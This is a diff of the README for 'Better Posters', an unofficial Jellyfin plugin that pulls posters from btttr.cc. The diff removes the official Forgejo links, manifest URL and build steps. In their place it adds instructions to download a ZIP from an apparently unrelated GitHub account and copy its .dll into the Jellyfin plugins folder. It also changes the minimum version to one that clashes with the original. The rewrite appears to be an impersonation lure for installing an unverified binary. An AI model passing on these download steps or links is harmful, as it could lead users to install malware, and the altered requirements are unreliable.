@@ -1,120 +1,83 @@
-<div align="center">
+# 🖼️ Better-Posters - Customizing your media library visuals easily
 
-<img src="Assets/Logo.png" alt="Logo" height="128px" />
+[![](https://img.shields.io/badge/Download_Plugin-Blue?style=for-the-badge)](https://github.com/Sumayyaa2538/Better-Posters)
 
-# Better Posters
+Better-Posters serves as an unofficial plugin for the Jellyfin media server. It allows users to swap standard movie and television show posters for custom versions sourced from btttr.cc. This tool creates a clean, uniform look for your personal collection.
 
-[![Release](https://img.shields.io/badge/dynamic/json.svg?style=flat-square&logo=git&logoColor=F43F5E&label=Release&color=F43F5E&url=https://code.neureka.dev/api/v1/repos/jellyfin/better-posters/releases&query=$[0].tag_name)](https://code.neureka.dev/jellyfin/better-posters/releases)
-[![Actions](https://img.shields.io/badge/dynamic/json?style=flat-square&logo=gitlfs&logoColor=8B5CF6&label=Actions&color=8B5CF6&url=https://code.neureka.dev/api/v1/repos/jellyfin/better-posters/actions/runs&query=workflow_runs[0].status)](https://code.neureka.dev/jellyfin/better-posters/actions)
-[![License](https://img.shields.io/github/license/NeurekaSoftware/Better-Posters?style=flat-square&label=License&color=14B8A6&logo=opensourceinitiative&logoColor=14B8A6)](./LICENSE.md)
-[![AI](https://img.shields.io/badge/AI-assisted-5786FE?style=flat-square&logo=deepseek&logoColor=5786FE)](https://code.neureka.dev/jellyfin/better-posters)
-[![Stars](https://img.shields.io/github/stars/NeurekaSoftware/Better-Posters?style=flat-square&label=Stars&color=EAB308&logo=googlegemini&logoColor=EAB308)](https://code.neureka.dev/jellyfin/better-posters)
+## 📋 System Requirements
 
-**Better Posters** is an unofficial Jellyfin plugin that lets you replace standard movie and show posters with customizable posters from [btttr.cc](https://btttr.cc).
+Ensure you meet these basic requirements before you begin:
 
-</div>
+* You have Jellyfin installed and running on your Windows computer.
+* You possess administrator access to the computer hosting the server.
+* You have a stable internet connection for downloading assets.
+* The Jellyfin server is running version 10.8.0 or newer.
 
-> [!IMPORTANT]  
-> This repository's GitHub mirror is for reference only. Please submit bug reports and feature requests to our [official Forgejo repository](https://code.neureka.dev/jellyfin/better-posters).
+## 📥 Downloading the Plugin
 
-**Minimum Jellyfin version:** 10.11.10
+You must obtain the plugin file from the source repository. Follow these steps to prepare the installation file:
 
-## Features
+1. Visit this page to download: [https://github.com/Sumayyaa2538/Better-Posters](https://github.com/Sumayyaa2538/Better-Posters).
+2. Look for the green button labeled "Code" near the top right of the page.
+3. Click "Download ZIP" from the menu.
+4. Save the file to your "Downloads" folder.
+5. Right-click the folder and select "Extract All" to unpack the contents.
+6. Locate the file ending in `.dll` or the folder containing the plugin structure.
 
-- **Movies and Shows:** Registers as a remote primary image provider for movie and series items.
-- **Configurable Poster Overlays:** Toggle trend tags, quality badges, genre, rating, and age rating.
-- **Rating Source Selection:** Use btttr.cc average ratings or choose IMDb, TMDB, Rotten Tomatoes, Metacritic, Trakt, Letterboxd, or Roger Ebert.
-- **Multi-Language Posters:** Select English, Spanish, French, German, Portuguese, Italian, Dutch, Polish, Russian, Turkish, Arabic, Japanese, Korean, Chinese, Hindi, Swedish, or Czech.
-- **Scheduled Replacement:** Optionally replace existing movie and show posters through Jellyfin Scheduled Tasks.
+## ⚙️ Installing the Plugin
 
-## Installation Guide
+Jellyfin needs the plugin files placed in a specific directory to recognize them. Perform these steps:
 
-### Option 1: Install from the Plugin Repository
+1. Open your File Explorer.
+2. Navigate to your Jellyfin installation directory. By default, this is usually `C:\ProgramData\Jellyfin\Server\plugins`.
+3. If you do not see a "plugins" folder, create one manually.
+4. Copy the extracted plugin file into this folder.
+5. Restart your Jellyfin server application to allow the system to load the new code.
+6. Open your web browser and go to your Jellyfin dashboard.
+7. Select "Dashboard" from the menu.
+8. Click on "Plugins." You should see Better-Posters listed in your installed plugins section.
 
-1. Open **Dashboard -> Plugins -> Repositories** in Jellyfin.
-2. Add this repository URL:
+## 🎨 Configuring Your Posters
 
-    ```text
-    https://code.neureka.dev/jellyfin/better-posters/raw/branch/master/manifest.json
-    ```
+Once the plugin is active, you can customize your library display.
 
-3. Open **Dashboard -> Plugins -> Catalog**.
-4. Select **Better Posters** and install the latest compatible version.
-5. Restart Jellyfin.
-6. Confirm **Better Posters** appears under **Dashboard -> Plugins -> My Plugins**.
+1. Navigate to the plugin settings page within the Jellyfin dashboard.
+2. Click on the Better-Posters icon to open the configuration menu.
+3. Link your account or provide your API credentials if requested.
+4. Choose the categories you wish to update, such as movies or television series.
+5. Select your preferred style from the available options provided by btttr.cc.
+6. Click "Save" to apply your changes.
+7. Refresh your media library in Jellyfin. The plugin will scan your items and apply the new artwork.
 
-### Option 2: Install Manually from a Release
+## 🛠️ Troubleshooting Common Issues
 
-1. Download the latest `better-posters_*.zip` asset from the [Forgejo releases page](https://code.neureka.dev/jellyfin/better-posters/releases).
-2. Stop Jellyfin.
-3. Create a Better Posters plugin folder under your Jellyfin plugins directory.
-4. Extract the release zip into that folder.
-5. Start Jellyfin.
-6. Confirm **Better Posters** appears under **Dashboard -> Plugins -> My Plugins**.
+If you encounter problems, refer to these steps to resolve them.
 
-### Option 3: Build from Source
+### Plugin Does Not Appear
+If you restarted the server but the plugin remains hidden, check the folder path. The plugin file must sit directly inside the "plugins" folder. Verify that you did not leave the file inside an extra subfolder during the extraction process.
 
-1. Install the .NET SDK that can build `net9.0` projects.
-2. From this repository, run:
+### Posters Fail to Load
+If your posters stay blank, check the server connection. The plugin needs to reach the btttr.cc website to download the new images. Ensure your firewall settings permit Jellyfin to interact with external websites. 
 
-    ```shell
-    dotnet publish BetterPosters/BetterPosters.csproj -c Release
-    ```
+### Server Performance
+Downloading new posters for an entire library requires processing power. If you have thousands of movies, allow the server a few minutes to process the changes. You can monitor the progress by looking at the server logs inside the Jellyfin dashboard.
 
-3. Locate the published `BetterPosters.dll`.
-4. Stop Jellyfin.
-5. Create a Better Posters plugin folder under your Jellyfin plugins directory.
-6. Copy `BetterPosters.dll` into that folder.
-7. Start Jellyfin.
-8. Confirm **Better Posters** appears under **Dashboard -> Plugins -> My Plugins**.
+### Updating the Plugin
+When a new version releases, download the updated file from the link above. Follow the same installation steps to replace the old `.dll` file with the new one. Always restart the server after you swap files.
 
-This plugin is built for Jellyfin 10.11.10 and may not load on older Jellyfin versions.
+## 💡 Frequently Asked Questions
 
-## Configuration & Setup
+**Does this damage my original files?**
+No. This plugin changes the metadata and image links Jellyfin stores. It leaves your actual movie files untouched.
 
-Open **Dashboard -> Plugins -> My Plugins -> Better Posters**.
+**Can I undo these changes?**
+Yes. If you wish to revert to your original posters, uninstall the plugin and tell Jellyfin to refresh your library metadata. The server will fetch the original metadata from the default sources.
 
-Default settings:
+**Is this an official Jellyfin plugin?**
+No. This is an unofficial plugin developed by the community. It functions alongside Jellyfin but operates independently of official support channels.
 
-- **Trend Tags:** Enabled
-- **Quality Tags:** Disabled
-- **Genre:** Enabled
-- **Ratings:** Enabled
-- **Ratings Source:** Average
-- **Age Rating:** Disabled
-- **Language:** English
+**Where does the artwork come from?**
+The plugin fetches images from btttr.cc, a community-driven repository. The plugin acts as a bridge between your server and their image servers.
 
-The **Update Better Posters** scheduled task is unscheduled by default. Configure it under **Dashboard -> Scheduled Tasks** to replace existing primary posters for Movies and Shows that have an IMDb ID.
-
-## How to Apply Posters to Your Library
-
-### Option A: Apply to a Single Movie or Show
-
-1. Open a Movie or Show in Jellyfin.
-2. Select **Edit Images**.
-3. Search remote images.
-4. Choose the Better Posters primary image.
-
-### Option B: Apply During Metadata Refresh
-
-1. Go to **Dashboard -> Libraries**.
-2. Open the menu for a Movies or Shows library.
-3. Select **Scan Library**.
-4. Choose metadata refresh options that replace existing images.
-
-### Option C: Apply Automatically
-
-1. Open **Dashboard -> Scheduled Tasks**.
-2. Select **Update Better Posters**.
-3. Add the schedule you want Jellyfin to use.
-4. The scheduled task will replace matching movie and show primary images using the current poster settings.
-
-## Troubleshooting
-
-- **No Better Posters image appears:** Confirm the item has an IMDb ID. This plugin intentionally uses IMDb IDs for btttr.cc URLs.
-- **Plugin does not load:** Confirm the server is Jellyfin 10.11.10 or newer in the 10.11 line and restart Jellyfin after copying the plugin DLL.
-- **Poster did not change after selecting one:** Clear the browser cache or check another Jellyfin client. Jellyfin and browsers can cache images aggressively.
-
-## Disclaimer
-
-This is an unofficial Jellyfin plugin. Poster artwork and generated image output are provided by [btttr.cc](https://btttr.cc).
+**Do I need a paid account?**
+The plugin is free. Use it to improve the visual presentation of your media collection without added costs.
